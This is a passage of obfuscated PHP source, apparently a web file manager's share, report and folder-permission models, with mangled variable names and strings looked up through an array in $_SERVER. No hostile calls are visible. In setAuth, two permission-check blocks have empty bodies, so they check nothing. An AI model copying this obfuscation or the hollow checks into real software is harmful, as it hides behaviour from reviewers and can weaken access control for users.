substr($¯Æñπº˜[$‹éú¨“Á[592]], strpos($¯Æñπº˜[$‹éú¨“Á[592]], $ôâÿıÿò)); $˙ı€·Ó∫ = array($‹éú¨“Á[193] => array($‹éú¨“Á[7], trim($∏‚¨˝ƒ¿, $‹éú¨“Á[50]))); $ÿπ∆Ü≈Ô = Model($‹éú¨“Á[897])->where($˙ı€·Ó∫)->field($‹éú¨“Á[32])->select(); $õù•ÏÆﬁ = array_to_keyvalue($ÿπ∆Ü≈Ô, $‹éú¨“Á[12], $‹éú¨“Á[32]); $õù•ÏÆﬁ[] = $¯Æñπº˜[$‹éú¨“Á[32]]; return implode($‹éú¨“Á[8], $õù•ÏÆﬁ); } protected function remove($ô–°ü—î) { $Áçµ±ñÚ =& $_SERVER[ß⁄ˆÇ†Œ]; $¢±ô⁄˘ê = is_array($ô–°ü—î) ? $ô–°ü—î : array($ô–°ü—î); for ($ä°˝∏ﬁ¢ = 0; $ä°˝∏ﬁ¢ < count($¢±ô⁄˘ê); $ä°˝∏ﬁ¢++) { $ËÙ°˜ø = $this->getInfo($¢±ô⁄˘ê[$ä°˝∏ﬁ¢]); if ($ËÙ°˜ø[$Áçµ±ñÚ[671]] == $Áçµ±ñÚ[91]) { Model($Áçµ±ñÚ[641])->eventShare($ËÙ°˜ø[$Áçµ±ñÚ[193]], $Áçµ±ñÚ[2124]); } if ($ËÙ°˜ø[$Áçµ±ñÚ[570]] == $Áçµ±ñÚ[91]) { Model($Áçµ±ñÚ[641])->eventShare($ËÙ°˜ø[$Áçµ±ñÚ[193]], $Áçµ±ñÚ[2123]); } } if (is_array($ô–°ü—î)) { $ô–°ü—î = array($Áçµ±ñÚ[7], $ô–°ü—î); } $‚ÅÜπœ£ = array($Áçµ±ñÚ[673] => $ô–°ü—î); $ÄÃÂä™Ö = $this->where($‚ÅÜπœ£)->delete(); if ($ÄÃÂä™Ö) { Model($Áçµ±ñÚ[674])->where(array($Áçµ±ñÚ[673] => $ô–°ü—î))->delete(); } return $ÄÃÂä™Ö; } protected function removeBySource($√¯˙éÛø) { $ÜÚâ˘€ÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $øí˚∂èË = array($ÜÚâ˘€ÿ[499] => array($ÜÚâ˘€ÿ[500], $√¯˙éÛø)); $⁄ûâÜÅù = $this->field($ÜÚâ˘€ÿ[673])->where($øí˚∂èË)->select(); $⁄ûâÜÅù = array_to_keyvalue($⁄ûâÜÅù, $ÜÚâ˘€ÿ[12], $ÜÚâ˘€ÿ[673]); if (!$⁄ûâÜÅù) { return; } $øí˚∂èË = array($ÜÚâ˘€ÿ[2130] => array($ÜÚâ˘€ÿ[500], $⁄ûâÜÅù)); $this->where($øí˚∂èË)->delete(); Model($ÜÚâ˘€ÿ[674])->where($øí˚∂èË)->delete(); } public function listAll($À◊ñäáå) { $≠˘˘∞¥’ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ø÷±˙äƒ = array(); if ($À◊ñäáå[$≠˘˘∞¥’[1764]]) { $Ø÷±˙äƒ[$≠˘˘∞¥’[1764]] = $À◊ñäáå[$≠˘˘∞¥’[1764]]; } if ($À◊ñäáå[$≠˘˘∞¥’[833]]) { $Å’˙ß¡Ø = $À◊ñäáå[$≠˘˘∞¥’[834]] ? $À◊ñäáå[$≠˘˘∞¥’[834]] : strtotime(date($≠˘˘∞¥’[2138])); $Ø÷±˙äƒ[$≠˘˘∞¥’[231]] = array($≠˘˘∞¥’[418], array($À◊ñäáå[$≠˘˘∞¥’[833]], $Å’˙ß¡Ø)); } if ($À◊ñäáå[$≠˘˘∞¥’[33]]) { $Ø÷±˙äƒ[$À◊ñäáå[$≠˘˘∞¥’[33]]] = 1; } else { $Ø÷±˙äƒ[] = array($≠˘˘∞¥’[570] => array($≠˘˘∞¥’[1086], 0), $≠˘˘∞¥’[671] => array($≠˘˘∞¥’[1086], 0), $≠˘˘∞¥’[2112] => $≠˘˘∞¥’[2065]); } if ($À◊ñäáå[$≠˘˘∞¥’[2061]]) { $Ø÷±˙äƒ[] = array($≠˘˘∞¥’[2109] => $À◊ñäáå[$≠˘˘∞¥’[2061]], $≠˘˘∞¥’[1653] => array($≠˘˘∞¥’[467], "\x25{$À◊ñäáå[$≠˘˘∞¥’[2061]]}\45"), $≠˘˘∞¥’[2112] => $≠˘˘∞¥’[2065]); } $Ìúµ≠úÿ = $this->_makeOrder()->where($Ø÷±˙äƒ)->selectPage(20); if (empty($Ìúµ≠úÿ[$≠˘˘∞¥’[454]])) { return array(); } $this->_listDataApply($Ìúµ≠úÿ[$≠˘˘∞¥’[454]]); return $Ìúµ≠úÿ; } public function listDataApply($∏÷îÿÏ“) { $this->_listDataApply($∏÷îÿÏ“); return $∏÷îÿÏ“; } private function _listDataApply(&$Ê‡πÏ¢ü) { $Ï°Õé≥˙ =& $_SERVER[ß⁄ˆÇ†Œ]; $ı®¿Øèπ = array_to_keyvalue($Ê‡πÏ¢ü, $Ï°Õé≥˙[12], $Ï°Õé≥˙[1764]); $ªØπÇ«ê = Model($Ï°Õé≥˙[606])->userListInfo(array_unique($ı®¿Øèπ)); $Ãﬂÿ¬âø = array_to_keyvalue($Ê‡πÏ¢ü, $Ï°Õé≥˙[12], $Ï°Õé≥˙[193]); $±†ˆ±„⁄ = Model($Ï°Õé≥˙[897])->sourceListInfo($Ãﬂÿ¬âø, !0); foreach ($Ê‡πÏ¢ü as $óﬁ›˝◊§ => &$¡ŸŒ»¬◊) { $ÎΩπÈ„‘ = $¡ŸŒ»¬◊[$Ï°Õé≥˙[1764]]; $¡ŸŒ»¬◊[$Ï°Õé≥˙[2139]] = $ªØπÇ«ê[$ÎΩπÈ„‘] ? $ªØπÇ«ê[$ÎΩπÈ„‘] : !1; $ü∫ÎîÌÆ = $¡ŸŒ»¬◊[$Ï°Õé≥˙[193]]; $¡ŸŒ»¬◊[$Ï°Õé≥˙[90]] = $±†ˆ±„⁄[$ü∫ÎîÌÆ] ? $±†ˆ±„⁄[$ü∫ÎîÌÆ] : !1; if ($¡ŸŒ»¬◊[$Ï°Õé≥˙[90]][$Ï°Õé≥˙[513]] == $Ï°Õé≥˙[91]) { unset($Ê‡πÏ¢ü[$óﬁ›˝◊§]); } if ($¡ŸŒ»¬◊[$Ï°Õé≥˙[90]] != $Ï°Õé≥˙[228] && !$¡ŸŒ»¬◊[$Ï°Õé≥˙[90]]) { unset($Ê‡πÏ¢ü[$óﬁ›˝◊§]); } } unset($¡ŸŒ»¬◊); $Ê‡πÏ¢ü = array_values($Ê‡πÏ¢ü); } private function _makeOrder($µ ˝≠çó = '') { $Å¿é†ÿÛ =& $_SERVER[ß⁄ˆÇ†Œ]; $îÌåóØõ = array($Å¿é†ÿÛ[231], $Å¿é†ÿÛ[834], $Å¿é†ÿÛ[2126], $Å¿é†ÿÛ[2127]); $ò‹◊¶‘º = array($Å¿é†ÿÛ[531] => $Å¿é†ÿÛ[532], $Å¿é†ÿÛ[533] => $Å¿é†ÿÛ[534]); $∆ıËè˛Ü = Input::get($Å¿é†ÿÛ[538], $Å¿é†ÿÛ[7], $Å¿é†ÿÛ[505], $îÌåóØõ); $•Œ ÚÌÄ = Input::get($Å¿é†ÿÛ[539], $Å¿é†ÿÛ[7], $Å¿é†ÿÛ[2140], array($Å¿é†ÿÛ[2058], $Å¿é†ÿÛ[533])); $•Œ ÚÌÄ = $ò‹◊¶‘º[$•Œ ÚÌÄ]; $µ ˝≠çó = $µ ˝≠çó . "{$∆ıËè˛Ü}\x20{$•Œ ÚÌÄ}"; return $this->order($µ ˝≠çó); } public function reportAdd($«ç¡Î»Ω) { $ØßŒ∞ô˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÿ‡è°ÔÅ = array($ØßŒ∞ô˚[673] => $«ç¡Î»Ω[$ØßŒ∞ô˚[673]], $ØßŒ∞ô˚[1764] => USER_ID); if (Model($ØßŒ∞ô˚[2136])->where($ÿ‡è°ÔÅ)->find()) { return !1; } $∏ﬁµ†œ≥ = array($ØßŒ∞ô˚[673] => $«ç¡Î»Ω[$ØßŒ∞ô˚[673]], $ØßŒ∞ô˚[1653] => $«ç¡Î»Ω[$ØßŒ∞ô˚[1653]], $ØßŒ∞ô˚[193] => $«ç¡Î»Ω[$ØßŒ∞ô˚[193]], $ØßŒ∞ô˚[549] => $«ç¡Î»Ω[$ØßŒ∞ô˚[549]], $ØßŒ∞ô˚[1764] => USER_ID, $ØßŒ∞ô˚[33] => $«ç¡Î»Ω[$ØßŒ∞ô˚[33]], $ØßŒ∞ô˚[534] => $«ç¡Î»Ω[$ØßŒ∞ô˚[534]]); return Model($ØßŒ∞ô˚[2136])->add($∏ﬁµ†œ≥); } public function reportList($ÅÅí˙ÒÄ) { $î‰´å˙≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $Û∫ì¥±˛ = array(); if ($ÅÅí˙ÒÄ[$î‰´å˙≠[833]]) { $»Äúä∆‘ = $ÅÅí˙ÒÄ[$î‰´å˙≠[834]] ? $ÅÅí˙ÒÄ[$î‰´å˙≠[834]] : strtotime(date($î‰´å˙≠[2138])); $Û∫ì¥±˛[$î‰´å˙≠[231]] = array($î‰´å˙≠[418], array($ÅÅí˙ÒÄ[$î‰´å˙≠[833]], $»Äúä∆‘)); } if (isset($ÅÅí˙ÒÄ[$î‰´å˙≠[33]]) && in_array($ÅÅí˙ÒÄ[$î‰´å˙≠[33]], array($î‰´å˙≠[91], $î‰´å˙≠[518], $î‰´å˙≠[2141], $î‰´å˙≠[2142], $î‰´å˙≠[2143]))) { $Û∫ì¥±˛[$î‰´å˙≠[33]] = $ÅÅí˙ÒÄ[$î‰´å˙≠[33]]; } if (isset($ÅÅí˙ÒÄ[$î‰´å˙≠[823]]) && in_array($ÅÅí˙ÒÄ[$î‰´å˙≠[823]], array($î‰´å˙≠[228], $î‰´å˙≠[91], $î‰´å˙≠[518], $î‰´å˙≠[2141]))) { $Û∫ì¥±˛[$î‰´å˙≠[823]] = $ÅÅí˙ÒÄ[$î‰´å˙≠[823]]; } $¨ê«≥éî = Input::get($î‰´å˙≠[539], $î‰´å˙≠[7], $î‰´å˙≠[2140], array($î‰´å˙≠[2058], $î‰´å˙≠[533])); $Ü¥æ‡˙Ö = array($î‰´å˙≠[531] => $î‰´å˙≠[532], $î‰´å˙≠[533] => $î‰´å˙≠[534]); $ŸˆËïıÿ = $î‰´å˙≠[2144] . $Ü¥æ‡˙Ö[$¨ê«≥éî]; $ﬂ¸’Æ»… = Model($î‰´å˙≠[2136])->where($Û∫ì¥±˛)->order($ŸˆËïıÿ)->selectPage(20); if (empty($ﬂ¸’Æ»…[$î‰´å˙≠[454]])) { return array(); } $¢∂ﬁöﬂÌ = array_to_keyvalue_group($ﬂ¸’Æ»…[$î‰´å˙≠[454]], $î‰´å˙≠[823], $î‰´å˙≠[673]); if (!empty($¢∂ﬁöﬂÌ[0])) { $ÅÅí˙ÒÄ = $¢∂ﬁöﬂÌ[0]; $Û∫ì¥±˛ = array($î‰´å˙≠[673] => array($î‰´å˙≠[7], $ÅÅí˙ÒÄ)); $àÚÔ≤÷ú = $this->where($Û∫ì¥±˛)->field($î‰´å˙≠[673])->select(); $àÚÔ≤÷ú = array_to_keyvalue($àÚÔ≤÷ú, $î‰´å˙≠[12], $î‰´å˙≠[673]); $–ÔÙ“ì⁄ = array_diff($ÅÅí˙ÒÄ, $àÚÔ≤÷ú); if (!empty($–ÔÙ“ì⁄)) { foreach ($ﬂ¸’Æ»…[$î‰´å˙≠[454]] as $∑ÎﬂƒΩ¨ => $Äêãï—ﬁ) { if (in_array($Äêãï—ﬁ[$î‰´å˙≠[673]], $–ÔÙ“ì⁄)) { unset($ﬂ¸’Æ»…[$î‰´å˙≠[454]][$∑ÎﬂƒΩ¨]); } } } } $this->_listDataApply($ﬂ¸’Æ»…[$î‰´å˙≠[454]]); return $ﬂ¸’Æ»…; } public function reportStatus($ñôÆäÂ») { $≈¡„˚Ω• =& $_SERVER[ß⁄ˆÇ†Œ]; $’¿Ú©ø≈ = array($≈¡„˚Ω•[483] => $ñôÆäÂ»[$≈¡„˚Ω•[483]]); $¿ëΩõ“Ù = Model($≈¡„˚Ω•[2136])->where($’¿Ú©ø≈)->field($≈¡„˚Ω•[2145])->find(); if (!$¿ëΩõ“Ù) { return !1; } $¬ª“π™¡ = array($≈¡„˚Ω•[823] => $ñôÆäÂ»[$≈¡„˚Ω•[823]]); if ($ñôÆäÂ»[$≈¡„˚Ω•[823]] == $≈¡„˚Ω•[2141] && $¿ëΩõ“Ù[$≈¡„˚Ω•[823]] == $≈¡„˚Ω•[2141]) { $¬ª“π™¡[$≈¡„˚Ω•[823]] = 0; } $ê∏«≥”˝ = Model($≈¡„˚Ω•[2136])->where($’¿Ú©ø≈)->save($¬ª“π™¡); if ($ñôÆäÂ»[$≈¡„˚Ω•[823]] == $≈¡„˚Ω•[518]) { if ($¿ëΩõ“Ù[$≈¡„˚Ω•[549]] != $≈¡„˚Ω•[228] && $this->shareFileMeta($¿ëΩõ“Ù[$≈¡„˚Ω•[549]])) { $this->shareFileMeta($¿ëΩõ“Ù[$≈¡„˚Ω•[549]], 0); } $this->remove($¿ëΩõ“Ù[$≈¡„˚Ω•[673]]); return !0; } if ($ê∏«≥”˝ && $ñôÆäÂ»[$≈¡„˚Ω•[823]] == $≈¡„˚Ω•[2141]) { $ò™ÉáÔ™ = $¬ª“π™¡[$≈¡„˚Ω•[823]] == $≈¡„˚Ω•[2141] ? 1 : 0; $this->shareFileMeta($¿ëΩõ“Ù[$≈¡„˚Ω•[549]], $ò™ÉáÔ™); $this->removeByFile($¿ëΩõ“Ù[$≈¡„˚Ω•[549]]); } return $ê∏«≥”˝; } private function removeByFile($«“É’ÇÓ) { $–ﬂ»Îá© =& $_SERVER[ß⁄ˆÇ†Œ]; $∏˚Ïäà∂ = Model($–ﬂ»Îá©[897])->where(array($–ﬂ»Îá©[549] => $«“É’ÇÓ))->field($–ﬂ»Îá©[193])->select(); $ò∞¢æí† = array_to_keyvalue($∏˚Ïäà∂, $–ﬂ»Îá©[12], $–ﬂ»Îá©[193]); $–Ùí¥Ó∞ = array($–ﬂ»Îá©[193] => array($–ﬂ»Îá©[7], $ò∞¢æí†), $–ﬂ»Îá©[570] => 1); $∏˚Ïäà∂ = $this->where($–Ùí¥Ó∞)->field($–ﬂ»Îá©[673])->select(); if (empty($∏˚Ïäà∂)) { return; } $ΩÛÛùœØ = array_to_keyvalue($∏˚Ïäà∂, $–ﬂ»Îá©[12], $–ﬂ»Îá©[673]); $this->remove($ΩÛÛùœØ); } private function shareFileMeta($•Ã˝ü¡Ñ, $ †Ωÿùˆ = null) { $˙§…◊ı‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $‰˜í“î = array($˙§…◊ı‡[549] => $•Ã˝ü¡Ñ, $˙§…◊ı‡[97] => $˙§…◊ı‡[2146]); if (is_null($ †Ωÿùˆ)) { return Model($˙§…◊ı‡[2147])->where($‰˜í“î)->find(); } $‰˜í“î[$˙§…◊ı‡[459]] = $ †Ωÿùˆ; Model($˙§…◊ı‡[2147])->add($‰˜í“î, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\165\162\143\x65\x5f\141\165\x74\150"; public function getAuth($õÛùƒÄ¥) { $≠à÷©∞ü =& $_SERVER[ß⁄ˆÇ†Œ]; $´ñƒ¥± = $this->sourceAuthSelect($õÛùƒÄ¥); $ç„ÃïÆÕ = array(); $¡»˘÷ì˜ = array(); $ÌÁ∞ò‹ä = 2 << 25; foreach ($´ñƒ¥± as $˙€∞ç‰ë) { $è∫ﬂá∑Ò = Model($≠à÷©∞ü[579])->listData($˙€∞ç‰ë[$≠à÷©∞ü[2071]]); if (!$è∫ﬂá∑Ò) { continue; } $ç„ÃïÆÕ[] = $˙€∞ç‰ë; $∏Ö—ËªÇ = 0; if ($˙€∞ç‰ë[$≠à÷©∞ü[190]] == SourceModel::TYPE_GROUP) { $∏Ö—ËªÇ = $ÌÁ∞ò‹ä * 2; } if ($˙€∞ç‰ë[$≠à÷©∞ü[190]] == SourceModel::TYPE_USER) { $∏Ö—ËªÇ = $ÌÁ∞ò‹ä; } if ($˙€∞ç‰ë[$≠à÷©∞ü[190]] == SourceModel::TYPE_USER && $˙€∞ç‰ë[$≠à÷©∞ü[577]] == $≠à÷©∞ü[228]) { $∏Ö—ËªÇ = 0; } $¡»˘÷ì˜[] = $è∫ﬂá∑Ò[$≠à÷©∞ü[495]] + $∏Ö—ËªÇ; } array_multisort($¡»˘÷ì˜, SORT_DESC, $ç„ÃïÆÕ); return $ç„ÃïÆÕ; } public function sourceAuthSelect($„†™Ôœô) { $Û∂‹¶œï =& $_SERVER[ß⁄ˆÇ†Œ]; static $©üÂ˜Ìè = array(); $»öô™ÊË = is_array($„†™Ôœô) ? !1 : !0; if ($»öô™ÊË) { $„†™Ôœô = array($„†™Ôœô); } $‚Ñ‚óãÅ = array(); foreach ($„†™Ôœô as $”‹Ò÷∏∑) { if (isset($©üÂ˜Ìè[$”‹Ò÷∏∑])) { $‚Ñ‚óãÅ[$”‹Ò÷∏∑] = $©üÂ˜Ìè[$”‹Ò÷∏∑]; } } if (count($‚Ñ‚óãÅ) == count($„†™Ôœô)) { return $»öô™ÊË ? $‚Ñ‚óãÅ[$„†™Ôœô[0]] : $‚Ñ‚óãÅ; } $®•∆›´∑ = $Û∂‹¶œï[2148]; $¸àúè˝æ = array($Û∂‹¶œï[193] => array($Û∂‹¶œï[7], $„†™Ôœô)); $¸›áØ˜∞ = $this->field($®•∆›´∑)->order($Û∂‹¶œï[483])->where($¸àúè˝æ)->select(); $‚À∑§ËÙ = array_to_keyvalue_group($¸›áØ˜∞, $Û∂‹¶œï[193]); foreach ($„†™Ôœô as $”‹Ò÷∏∑) { $©üÂ˜Ìè[$”‹Ò÷∏∑] = $‚À∑§ËÙ[$”‹Ò÷∏∑] ? $‚À∑§ËÙ[$”‹Ò÷∏∑] : array(); } if ($»öô™ÊË) { return $¸›áØ˜∞; } return $‚À∑§ËÙ; } public function setAuth($¢èŸôŸë, $àÚæëÎÿ) { $ÌÑ˛û–⁄ =& $_SERVER[ß⁄ˆÇ†Œ]; $©ˆ«˜ƒ¥ = Model($ÌÑ˛û–⁄[1414])->sourceInfo($¢èŸôŸë); if (!$©ˆ«˜ƒ¥) { return !1; } if ($©ˆ«˜ƒ¥[$ÌÑ˛û–⁄[190]] != SourceModel::TYPE_GROUP) { return !1; } $ó∆…â≥ï = 1; $Ñ·åÙ˜ï = $©ˆ«˜ƒ¥[$ÌÑ˛û–⁄[577]]; if ($Ñ·åÙ˜ï != $ó∆…â≥ï) { $©Øπÿ˚õ = array($ÌÑ˛û–⁄[1963] => $Ñ·åÙ˜ï); $ªÙÈÍ¸‰ = Model($ÌÑ˛û–⁄[2057])->field($ÌÑ˛û–⁄[1764])->where($©Øπÿ˚õ)->select(); $ªÙÈÍ¸‰ = array_to_keyvalue($ªÙÈÍ¸‰, $ÌÑ˛û–⁄[12], $ÌÑ˛û–⁄[1764]); } $Ñ˝ü˜ÎÌ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $´Á≈åú‹ = array(); foreach ($àÚæëÎÿ as $ËÑ¥º’®) { if (!in_array($ËÑ¥º’®[$ÌÑ˛û–⁄[190]], $Ñ˝ü˜ÎÌ)) { show_json(LNG($ÌÑ˛û–⁄[2149]), !1); } if ($Ñ·åÙ˜ï != $ó∆…â≥ï) { if ($ËÑ¥º’®[$ÌÑ˛û–⁄[190]] == SourceModel::TYPE_GROUP) { } if ($ËÑ¥º’®[$ÌÑ˛û–⁄[577]] != 0 && !in_array($ËÑ¥º’®[$ÌÑ˛û–⁄[577]], $ªÙÈÍ¸‰)) { } } if ($ËÑ¥º’®[$ÌÑ˛û–⁄[577]] == 0) { $ËÑ¥º’®[$ÌÑ˛û–⁄[190]] = SourceModel::TYPE_USER; } $´Á≈åú‹[] = array($ÌÑ˛û–⁄[193] => $¢èŸôŸë, $ÌÑ˛û–⁄[190] => intval($ËÑ¥º’®[$ÌÑ˛û–⁄[190]]), $ÌÑ˛û–⁄[577] => intval($ËÑ¥º’®[$ÌÑ˛û–⁄[577]]), $ÌÑ˛û–⁄[2071] => intval($ËÑ¥º’®[$ÌÑ˛û–⁄[2071]]) ? intval($ËÑ¥º’®[$ÌÑ˛û–⁄[2071]]) : 0, $ÌÑ˛û–⁄[2131] => intval($ËÑ¥º’®[$ÌÑ˛û–⁄[2131]]) ? intval($ËÑ¥º’®[$ÌÑ˛û–⁄[2131]]) : -1); } $this->where(array($ÌÑ˛û–⁄[499] => $¢èŸôŸë))->delete(); $this->addAll($´Á≈åú‹); return !0; } public function authClear($Èû¥¬ˆç) { $—®ê‹°Ï =& $_SERVER[ß⁄ˆÇ†Œ]; $¨∆÷Ù‡Ë = Model($—®ê‹°Ï[1414])->sourceInfo($Èû¥¬ˆç); $Å¬≈≤›ë = array($Èû¥¬ˆç); if ($¨∆÷Ù‡Ë[$—®ê‹°Ï[493]] == $—®ê‹°Ï[91]) { $…Ωò‘ºË = array($—®ê‹°Ï[660] => array($—®ê‹°Ï[620], $¨∆÷Ù‡Ë[$—®ê‹°Ï[592]] . $Èû¥¬ˆç . $—®ê‹°Ï[621])); $Å¬≈≤›ë = Model($—®ê‹°Ï[1414])->field($—®ê‹°Ï[499])->where($…Ωò‘ºË)->getField($—®ê‹°Ï[193], !0); $Å¬≈≤›ë[] = $Èû¥¬ˆç; } $this->where(array($—®ê‹°Ï[499] => array($—®ê‹°Ï[500], $Å¬≈≤›ë)))->delete(); return !0; } public function getAllChildren($ïìÉΩ◊˚) { $ÀÜ√àëı =& $_SERVER[ß⁄ˆÇ†Œ]; $úÈ≠ìÅ¨ = Model($ÀÜ√àëı[1414])->sourceInfo($ïìÉΩ◊˚); if ($úÈ≠ìÅ¨[$ÀÜ√àëı[493]] != $ÀÜ√àëı[91]) { return $this->sourceListAuth(array($ïìÉΩ◊˚)); } if ($úÈ≠ìÅ¨[$ÀÜ√àëı[190]] != SourceModel::TYPE_GROUP) { return array(); } $˛ÊÄÕàâ = 1; $∂¢ïìõ© = array($ïìÉΩ◊˚); if ($úÈ≠ìÅ¨[$ÀÜ√àëı[192]] == $ÀÜ√àëı[228] && $úÈ≠ìÅ¨[$ÀÜ√àëı[577]] != $˛ÊÄÕàâ) { $∂¢ïìõ© = $this->groupChidldAllRootSource($úÈ≠ìÅ¨[$ÀÜ√àëı[577]]); } $˝ËÉ∫Àä = $this->field($ÀÜ√àëı[193])->group($ÀÜ√àëı[193])->select(); $˝ËÉ∫Àä = array_to_keyvalue($˝ËÉ∫Àä, $ÀÜ√àëı[12], $ÀÜ√àëı[193]); if (!$˝ËÉ∫Àä) { return array(); } $ü—Ï∂éú = $ÀÜ√àëı[2150]; $÷⁄°Ÿñ´ = array($ÀÜ√àëı[193] => array($ÀÜ√àëı[7], $˝ËÉ∫Àä), $ÀÜ√àëı[513] => $ÀÜ√àëı[228]); $¢≠á¬∑Å = Model($ÀÜ√àëı[897])->field($ü—Ï∂éú)->where($÷⁄°Ÿñ´)->select(); $Îä˝√œû = array($ïìÉΩ◊˚); foreach ($¢≠á¬∑Å as $ÌïúûÚõ) { foreach ($∂¢ïìõ© as $ô±ÔçŸÏ) { $äÙ’êˆ¸ = $ÀÜ√àëı[50] . $ô±ÔçŸÏ . $ÀÜ√àëı[50]; $ëÂ∂¶Íƒ = $ÌïúûÚõ[$ÀÜ√àëı[592]] . $ÌïúûÚõ[$ÀÜ√àëı[193]] . $ÀÜ√àëı[50]; if (strstr($ëÂ∂¶Íƒ, $äÙ’êˆ¸)) { $Îä˝√œû[] = $ÌïúûÚõ[$ÀÜ√àëı[193]]; break; } } } return $this->sourceListAuth($Îä˝√œû); } private function sourceListAuth($≤€ç∆ªú) { $ñì·ΩàØ =& $_SERVER[ß⁄ˆÇ†Œ]; $¸ÚÑ«ÓÕ = Model($ñì·ΩàØ[1414])->sourceListInfo($≤€ç∆ªú, !0); $ÁÓËÔ…„ = $this->sourceAuthSelect($≤€ç∆ªú); $„∂ë≥—Ö = array(); $Œ•ì—ë≈ = array(); foreach ($¸ÚÑ«ÓÕ as $µüä¨À˜) { unset($µüä¨À˜[$ñì·ΩàØ[537]]); unset($µüä¨À˜[$ñì·ΩàØ[535]]); unset($µüä¨À˜[$ñì·ΩàØ[495]]); unset($µüä¨À˜[$ñì·ΩàØ[90]]); $í¸ÂÜ—ñ = $ÁÓËÔ…„[$µüä¨À˜[$ñì·ΩàØ[193]]]; if (!$í¸ÂÜ—ñ) { continue; } $µüä¨À˜[$ñì·ΩàØ[2151]] = $this->authTargetInfo($í¸ÂÜ—ñ); $µüä¨À˜[$ñì·ΩàØ[590]] = rtrim($µüä¨À˜[$ñì·ΩàØ[596]], $ñì·ΩàØ[8]) . $ñì·ΩàØ[8] . ltrim($µüä¨À˜[$ñì·ΩàØ[590]], $ñì·ΩàØ[8]); $„∂ë≥—Ö[] = $µüä¨À˜; $ò¢€Ô“› = count(explode($ñì·ΩàØ[8], trim($µüä¨À˜[$ñì·ΩàØ[590]], $ñì·ΩàØ[8]))); $Œ•ì—ë≈[] = $ò¢€Ô“› + ($µüä¨À˜[$ñì·ΩàØ[33]] == $ñì·ΩàØ[78] ? 0 : 1000); } array_multisort($Œ•ì—ë≈, SORT_ASC, $„∂ë≥—Ö); return $„∂ë≥—Ö; } private function groupChidldAllRootSource($—ÛÑ¸‡≥) { $è§¬ÿ≥Á =& $_SERVER[ß⁄ˆÇ†Œ]; $ñ»º•ÉÄ = Model($è§¬ÿ≥Á[2152])->groupChildrenAll($—ÛÑ¸‡≥); $Íô‹·∂Æ = array($è§¬ÿ≥Á[192] => 0, $è§¬ÿ≥Á[577] => array($è§¬ÿ≥Á[7], $ñ»º•ÉÄ), $è§¬ÿ≥Á[190] => SourceModel::TYPE_GROUP); $ﬂùù™çÂ = Model($è§¬ÿ≥Á[897])->field($è§¬ÿ≥Á[193])->where($Íô‹·∂Æ)->select(); $ﬂùù™çÂ = array_to_keyvalue($ﬂùù™çÂ, $è§¬ÿ≥Á[12], $è§¬ÿ≥Á[193]); return $ﬂùù™çÂ; } private function authTargetInfo($ùΩ’∫áı) { $€ˆ‰≠íŒ =& $_SERVER[ß⁄ˆÇ†Œ]; $à·õÙì¶ = array(); $∏§Ôã¨∂ = array(); $Ã¬çâü¡ = 2 << 25; foreach ($ùΩ’∫áı as $ı—˘‡§–) { $øπ„î©î = Model($€ˆ‰≠íŒ[579])->listData($ı—˘‡§–[$€ˆ‰≠íŒ[2071]]); if (!$øπ„î©î) { continue; } if ($ı—˘‡§–[$€ˆ‰≠íŒ[190]] == SourceModel::TYPE_USER) { $íÈø“’ı = Model($€ˆ‰≠íŒ[585])->getInfoSimpleOuter($ı—˘‡§–[$€ˆ‰≠íŒ[577]]); if ($íÈø“’ı[$€ˆ‰≠íŒ[1764]] == $€ˆ‰≠íŒ[1269]) { continue; } if ($íÈø“’ı[$€ˆ‰≠íŒ[1764]] == $€ˆ‰≠íŒ[228]) { $íÈø“’ı[$€ˆ‰≠íŒ[32]] = LNG($€ˆ‰≠íŒ[2153]); } } else { $íÈø“’ı = Model($€ˆ‰≠íŒ[593])->getInfoSimple($ı—˘‡§–[$€ˆ‰≠íŒ[577]]); } if (!$íÈø“’ı) { continue; } $íÈø“’ı[$€ˆ‰≠íŒ[548]] = $øπ„î©î; $à·õÙì¶[] = $íÈø“’ı; $úÁÓ›Ó” = 0; if ($ı—˘‡§–[$€ˆ‰≠íŒ[190]] == SourceModel::TYPE_GROUP) { $úÁÓ›Ó” = $Ã¬çâü¡ * 2; } if ($ı—˘‡§–[$€ˆ‰≠íŒ[190]] == SourceModel::TYPE_USER) { $úÁÓ›Ó” = $Ã¬çâü¡; } if ($ı—˘‡§–[$€ˆ‰≠íŒ[190]] == SourceModel::TYPE_USER && $ı—˘‡§–[$€ˆ‰≠íŒ[577]] == $€ˆ‰≠íŒ[228]) { $úÁÓ›Ó” = 0; } $∏§Ôã¨∂[] = $øπ„î©î[$€ˆ‰≠íŒ[495]] + $úÁÓ›Ó”; } array_multisort($∏§Ôã¨∂, SORT_DESC, $à·õÙì¶); return $à·õÙì¶; } public function getAllChildrenByUser($îÍ÷Ã„¶, $»≈öäáŒ) { $êµöæûÂ =& $_SERVER[ß⁄ˆÇ†Œ]; $§∫∏•…Ë = Model($êµöæûÂ[606])->getInfo($»≈öäáŒ); if (!$»≈öäáŒ || !$îÍ÷Ã„¶ || !$§∫∏•…Ë) { return array(); } $ñ∂∏€Ä˝ = Model($êµöæûÂ[1414])->sourceInfo($îÍ÷Ã„¶); $Ÿ‚—›ï≤ = array(); $ƒÎ‹·ê‰ = 1; if ($ñ∂∏€Ä˝[$êµöæûÂ[192]] == $êµöæûÂ[228] && $ñ∂∏€Ä˝[$êµöæûÂ[577]] != $ƒÎ‹·ê‰ && $this->groupContainUser($ñ∂∏€Ä˝[$êµöæûÂ[577]], $»≈öäáŒ)) { foreach ($§∫∏•…Ë[$êµöæûÂ[2154]] as $äÒ∂≤◊ç) { $ü£∑·¢∫ = Model($êµöæûÂ[593])->getInfo($äÒ∂≤◊ç[$êµöæûÂ[1963]]); $Ü∂å®Ω≈ = Model($êµöæûÂ[606])->getInfoSimpleOuter($»≈öäáŒ); $Ü∂å®Ω≈[$êµöæûÂ[548]] = $äÒ∂≤◊ç[$êµöæûÂ[495]]; if (Model($êµöæûÂ[579])->authCheckAction($äÒ∂≤◊ç[$êµöæûÂ[495]][$êµöæûÂ[495]], $êµöæûÂ[1984])) { continue; } $©ÇÚÎ‡ñ = array($êµöæûÂ[32] => $êµöæûÂ[1289] . 